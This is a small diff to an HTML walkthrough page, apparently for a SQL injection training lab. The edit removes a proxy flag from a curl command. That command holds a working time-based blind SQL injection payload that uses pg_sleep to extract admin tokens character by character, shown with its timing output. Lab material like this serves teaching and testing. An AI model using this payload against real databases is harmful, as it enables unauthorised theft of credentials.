@@ -155,7 +155,7 @@
         <span class="terminal-title">curl. Manual Timing Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}" "http://localhost/SQLi-Arena/pgsql/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN ASCII(SUBSTRING(token,1,1))=70 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --"<br><br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}" "http://localhost/SQLi-Arena/pgsql/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN ASCII(SUBSTRING(token,1,1))=70 THEN pg_sleep(2) ELSE pg_sleep(0) END FROM admin_tokens LIMIT 1) IS NOT NULL --"<br><br>
         <span class="prompt"># </span>Response time: 2s -- confirms ASCII 70 = 'F'<br>
         <span class="prompt">Output:</span> Response: Session checked. Response time: 2s<br>
         <span class="prompt">Time: </span>2.030295
